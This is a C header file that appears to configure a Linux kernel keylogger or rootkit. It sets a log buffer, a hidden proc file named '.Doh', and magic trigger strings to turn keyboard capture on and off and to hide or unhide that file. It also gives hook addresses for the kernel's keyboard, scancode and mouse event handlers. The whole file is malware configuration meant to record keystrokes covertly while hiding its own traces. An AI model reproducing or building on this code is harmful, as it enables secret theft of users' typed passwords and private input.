#define LOG_LENGTH	4096		/* log size */
#define NAME		".Doh"		/* name for the proc file */
#define NAME_LENGTH	4		/* length of the name */

/* magic: */
#define MAGIC   "AAAAAAAAAAAAAAAAAAAAA"		/* magic: this string + one of the below */
/* actions: */
#define OF_KB   "mmmmmmmmmmmmmmmmmmmmm"		/* turn off/on keyboard */
#define OF_PR	"asasdasdasdasdasdasda"		/* unhide/hide procfile */


/*
 * do not edit below this line!
 */
#include "addresses.h"

#ifndef HANDLE_KBD_EVENT_ADD
#define HANDLE_KBD_EVENT_ADD	0
#endif

#ifndef HANDLE_MOUSE_EVENT_ADD
#define HANDLE_MOUSE_EVENT_ADD  0
#endif

#ifndef HANDLE_SCANCODE_ADD
#define HANDLE_SCANCODE_ADD     0
#endif

#ifndef DO_ACKNOWLEDGE_ADD
#define DO_ACKNOWLEDGE_ADD      0
#endif
